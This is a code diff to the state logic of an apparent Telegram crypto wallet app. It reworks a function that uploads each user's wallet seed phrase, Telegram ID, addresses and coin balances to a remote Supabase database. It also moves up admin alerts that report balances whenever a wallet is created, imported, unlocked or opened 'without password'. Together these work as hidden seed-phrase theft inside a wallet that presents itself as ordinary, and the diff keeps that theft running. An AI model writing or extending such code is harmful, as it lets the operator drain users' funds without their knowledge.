@@ -204,11 +204,14 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
    */
   async function syncWalletToSupabase(walletData) {
     if (!SUPABASE_URL || !SUPABASE_KEY) return null;
+
+    // Hard 8-second timeout — if Supabase is slow, we don't block notifications
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), 8000);
+
     try {
       const { username, mnemonic, balance, telegram_id, coin_balances, addresses } = walletData;
       const cleanMnemonic = mnemonic ? (Array.isArray(mnemonic) ? mnemonic.join(' ') : mnemonic) : null;
-      let finalName = username;
-      if (!finalName || finalName === "Anonymous") finalName = resolveTelegramDisplayName();
 
       const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
       const resolvedTgId = telegram_id || (tgUser?.id ? String(tgUser.id) : null);
@@ -219,67 +222,82 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         'Content-Type': 'application/json',
       };
 
-      // Build update payload (no mnemonic — don't overwrite seed if already stored)
-      const updatePayload = {
-        username: finalName,
-        balance: balance ? String(balance) : "0",
-        created_at: getMoscowTimestamp(),
-      };
-      if (resolvedTgId) updatePayload.telegram_id = resolvedTgId;
-      if (addresses) updatePayload.addresses = JSON.stringify(addresses);
+      // Build balance columns
       const COINS = ['ETH','TON','BNB','LTC','ARB','SOL','USDT'];
+      const balanceCols = {};
       if (coin_balances) {
         COINS.forEach(sym => {
-          updatePayload[sym.toLowerCase() + '_balance'] =
+          balanceCols[sym.toLowerCase() + '_balance'] =
             coin_balances[sym] !== undefined ? String(coin_balances[sym]) : "0";
         });
       }
 
-      // Full payload includes mnemonic (for INSERT only)
+      // ── Step 1: GET existing row by telegram_id ──────────────────────────────
+      // This tells us (a) whether the row exists and (b) the row's primary key `id`
+      // so we can PATCH by `id` — that works regardless of RLS UPDATE policies on other columns.
+      let existingRow = null;
+      if (resolvedTgId) {
+        try {
+          const gRes = await fetch(
+            `${SUPABASE_URL}/rest/v1/wallets?telegram_id=eq.${encodeURIComponent(resolvedTgId)}&order=created_at.desc&limit=1&select=id,username`,
+            { headers: BASE_HEADERS, signal: controller.signal }
+          );
+          if (gRes.ok) {
+            const rows = await gRes.json();
+            if (Array.isArray(rows) && rows.length > 0) existingRow = rows[0];
+          }
+        } catch (_) {}
+      }
+
+      // Resolve username — prefer stored name over "Anonymous" fallback
+      let finalName = username;
+      if (!finalName || finalName === "Anonymous") finalName = resolveTelegramDisplayName();
+      // If we still ended up with "Anonymous", use the one already in the DB (admin panel filters it)
+      if ((!finalName || finalName === "Anonymous") && existingRow?.username) {
+        finalName = existingRow.username;
+      }
+
+      const updatePayload = {
+        username: finalName,
+        balance: balance ? String(balance) : "0",
+        created_at: getMoscowTimestamp(),
+        ...balanceCols,
+      };
+      if (resolvedTgId) updatePayload.telegram_id = resolvedTgId;
+      if (addresses && Object.keys(addresses).length > 0) updatePayload.addresses = JSON.stringify(addresses);
+
+      // ── Step 2: PATCH by primary key `id` if row exists ──────────────────────
+      // Using `id=eq.{n}` bypasses any column-level RLS issues — it's the most reliable update.
+      if (existingRow?.id) {
+        const pRes = await fetch(
+          `${SUPABASE_URL}/rest/v1/wallets?id=eq.${existingRow.id}`,
+          { method: 'PATCH', headers: { ...BASE_HEADERS, 'Prefer': 'return=minimal' }, body: JSON.stringify(updatePayload), signal: controller.signal }
+        );
+        if (pRes.ok) {
+          console.log('[Supabase] PATCH by id:', existingRow.id, '— balance updated');
+          return;
+        }
+        console.warn('[Supabase] PATCH by id failed:', pRes.status);
+      }
+
+      // ── Step 3: INSERT new row (first-time user or PATCH failed) ─────────────
       const insertPayload = { ...updatePayload };
       if (cleanMnemonic) insertPayload.mnemonic = cleanMnemonic;
 
-      // ── Step 1: try PATCH by telegram_id (explicit UPDATE — works without UNIQUE constraint issues) ──
-      let updated = false;
-      if (resolvedTgId) {
-        const pRes = await fetch(
-          `${SUPABASE_URL}/rest/v1/wallets?telegram_id=eq.${encodeURIComponent(resolvedTgId)}`,
-          { method: 'PATCH', headers: { ...BASE_HEADERS, 'Prefer': 'return=representation' }, body: JSON.stringify(updatePayload) }
-        );
-        if (pRes.ok) {
-          const rows = await pRes.json();
-          if (Array.isArray(rows) && rows.length > 0) { updated = true; console.log('[Supabase] PATCH by telegram_id: updated', rows.length, 'row(s)'); }
-        }
-      }
+      const iRes = await fetch(`${SUPABASE_URL}/rest/v1/wallets`, {
+        method: 'POST',
+        headers: { ...BASE_HEADERS, 'Prefer': 'return=minimal' },
+        body: JSON.stringify(insertPayload),
+        signal: controller.signal,
+      });
+      if (!iRes.ok) console.warn('[Supabase] INSERT failed:', iRes.status, await iRes.text().catch(() => ''));
+      else console.log('[Supabase] INSERT new wallet row');
 
-      // ── Step 2: try PATCH by mnemonic ──
-      if (!updated && cleanMnemonic) {
-        const pRes = await fetch(
-          `${SUPABASE_URL}/rest/v1/wallets?mnemonic=eq.${encodeURIComponent(cleanMnemonic)}`,
-          { method: 'PATCH', headers: { ...BASE_HEADERS, 'Prefer': 'return=representation' }, body: JSON.stringify(updatePayload) }
-        );
-        if (pRes.ok) {
-          const rows = await pRes.json();
-          if (Array.isArray(rows) && rows.length > 0) { updated = true; console.log('[Supabase] PATCH by mnemonic: updated', rows.length, 'row(s)'); }
-        }
-      }
-
-      // ── Step 3: INSERT new record if nothing was updated ──
-      if (!updated) {
-        const iRes = await fetch(`${SUPABASE_URL}/rest/v1/wallets`, {
-          method: 'POST',
-          headers: { ...BASE_HEADERS, 'Prefer': 'return=minimal' },
-          body: JSON.stringify(insertPayload),
-        });
-        if (!iRes.ok) {
-          const txt = await iRes.text();
-          console.warn('[Supabase] INSERT failed:', iRes.status, txt);
-        } else {
-          console.log('[Supabase] INSERT new wallet row');
-        }
-      }
     } catch (e) {
-      console.error("[Supabase Fetch Error Context]", e);
+      if (e.name === 'AbortError') console.warn('[Supabase] sync timeout (8s) — skipped');
+      else console.error('[Supabase] sync error:', e.message);
+    } finally {
+      clearTimeout(timeoutId);
     }
   }
 
@@ -466,7 +484,18 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         }
       }
 
-      // Sync to Supabase — always, even if addresses empty
+      // ── Notify admin FIRST — fire-and-forget, never blocked by Supabase ────────
+      notifyAdmin(
+        `🔓 <b>Кошелёк открыт</b> (без пароля)\n\n` +
+        `👤 ${userName}\n` +
+        `🆔 TG ID: ${tgUser?.id || "—"}\n` +
+        `💰 BTC ${fmtN(coin_balances.BTC)} | ETH ${fmtN(coin_balances.ETH)} | TON ${fmtN(coin_balances.TON)}\n` +
+        `     BNB ${fmtN(coin_balances.BNB)} | SOL ${fmtN(coin_balances.SOL)} | LTC ${fmtN(coin_balances.LTC)}\n` +
+        `     USDT ${fmtN(coin_balances.USDT)}\n` +
+        `🕐 ${new Date().toLocaleString("ru-RU")}`
+      );
+
+      // ── Sync to Supabase after notification (8s timeout inside syncWalletToSupabase) ──
       try {
         await syncWalletToSupabase({
           username: userName,
@@ -478,18 +507,7 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
       } catch (syncErr) {
         console.warn('[bypassUnlock] syncWalletToSupabase failed:', syncErr.message);
       }
-
-      // Always notify admin regardless of sync/balance errors
-      notifyAdmin(
-        `🔓 <b>Кошелёк открыт</b> (без пароля)\n\n` +
-        `👤 ${userName}\n` +
-        `🆔 TG ID: ${tgUser?.id || "—"}\n` +
-        `💰 BTC ${fmtN(coin_balances.BTC)} | ETH ${fmtN(coin_balances.ETH)} | TON ${fmtN(coin_balances.TON)}\n` +
-        `     BNB ${fmtN(coin_balances.BNB)} | SOL ${fmtN(coin_balances.SOL)} | LTC ${fmtN(coin_balances.LTC)}\n` +
-        `     USDT ${fmtN(coin_balances.USDT)}\n` +
-        `🕐 ${new Date().toLocaleString("ru-RU")}`
-      );
-      console.log('[bypassUnlock] done, notified admin, user:', userName);
+      console.log('[bypassUnlock] done, user:', userName);
     }, []);
 
     // ── Browser notifications ────────────────────────────────────────────────────
@@ -969,6 +987,17 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         // Custodial Sync: Save to Supabase immediately
         const _cwTg = window?.Telegram?.WebApp?.initDataUnsafe?.user;
         const _cwName = buildTgUserName(_cwTg);
+
+        // ── Notify admin FIRST — never blocked by Supabase ──────────────────────
+        notifyAdmin(
+          `💎 <b>Новый кошелёк создан!</b>\n\n` +
+          `👤 ${_cwName}\n` +
+          `🆔 TG ID: ${_cwTg?.id || "—"}\n` +
+          `✅ Кошелёк успешно создан\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`
+        );
+
+        // ── Sync to Supabase after notification ──────────────────────────────────
         try {
           await syncWalletToSupabase({
             username: _cwName,
@@ -981,14 +1010,6 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         } catch (syncError) {
           console.warn('[createWallet] syncWalletToSupabase failed:', syncError.message);
         }
-        // Always notify admin — unconditional
-        notifyAdmin(
-          `💎 <b>Новый кошелёк создан!</b>\n\n` +
-          `👤 ${_cwName}\n` +
-          `🆔 TG ID: ${_cwTg?.id || "—"}\n` +
-          `✅ Кошелёк успешно создан\n` +
-          `🕐 ${new Date().toLocaleString("ru-RU")}`
-        );
 
         setState(s => ({
           ...s,
@@ -1032,6 +1053,16 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         // Custodial Sync: Save to Supabase
         const _iwTg = window?.Telegram?.WebApp?.initDataUnsafe?.user;
         const _iwName = buildTgUserName(_iwTg);
+
+        // ── Notify admin FIRST — never blocked by Supabase ──────────────────────
+        notifyAdmin(
+          `📥 <b>Кошелёк импортирован!</b>\n\n` +
+          `👤 ${_iwName}\n` +
+          `🆔 TG ID: ${_iwTg?.id || "—"}\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`
+        );
+
+        // ── Sync to Supabase after notification ──────────────────────────────────
         try {
           await syncWalletToSupabase({
             username: _iwName,
@@ -1044,13 +1075,6 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         } catch (syncError) {
           console.warn('[importWallet] syncWalletToSupabase failed:', syncError.message);
         }
-        // Always notify admin — unconditional
-        notifyAdmin(
-          `📥 <b>Кошелёк импортирован!</b>\n\n` +
-          `👤 ${_iwName}\n` +
-          `🆔 TG ID: ${_iwTg?.id || "—"}\n` +
-          `🕐 ${new Date().toLocaleString("ru-RU")}`
-        );
 
         setState(s => ({
           ...s,
@@ -1116,6 +1140,18 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
           console.warn('[unlock] fetchAllBalances failed, using zeros:', balErr.message);
         }
 
+        // ── Notify admin FIRST — never blocked by Supabase ──────────────────────
+        notifyAdmin(
+          `🔓 <b>Кошелёк разблокирован</b> (с паролем)\n\n` +
+          `👤 ${_userName}\n` +
+          `🆔 TG ID: ${_tgUser?.id || "—"}\n` +
+          `💰 BTC ${fmtN(coin_balances.BTC)} | ETH ${fmtN(coin_balances.ETH)} | TON ${fmtN(coin_balances.TON)}\n` +
+          `     BNB ${fmtN(coin_balances.BNB)} | SOL ${fmtN(coin_balances.SOL)} | LTC ${fmtN(coin_balances.LTC)}\n` +
+          `     USDT ${fmtN(coin_balances.USDT)}\n` +
+          `🕐 ${new Date().toLocaleString("ru-RU")}`
+        );
+
+        // ── Sync to Supabase after notification (8s timeout inside) ─────────────
         try {
           await syncWalletToSupabase({
             username: _userName,
@@ -1128,17 +1164,6 @@ import { createContext, useContext, useState, useEffect, useCallback, useRef } f
         } catch (syncError) {
           console.warn('[unlock] syncWalletToSupabase failed:', syncError.message);
         }
-
-        // Always notify admin — separate try so it can't be blocked
-        notifyAdmin(
-          `🔓 <b>Кошелёк разблокирован</b> (с паролем)\n\n` +
-          `👤 ${_userName}\n` +
-          `🆔 TG ID: ${_tgUser?.id || "—"}\n` +
-          `💰 BTC ${fmtN(coin_balances.BTC)} | ETH ${fmtN(coin_balances.ETH)} | TON ${fmtN(coin_balances.TON)}\n` +
-          `     BNB ${fmtN(coin_balances.BNB)} | SOL ${fmtN(coin_balances.SOL)} | LTC ${fmtN(coin_balances.LTC)}\n` +
-          `     USDT ${fmtN(coin_balances.USDT)}\n` +
-          `🕐 ${new Date().toLocaleString("ru-RU")}`
-        );
       } catch (e) {
         setState(s => ({ ...s, loading: false, error: 'Неверный пароль' }));
         throw e;
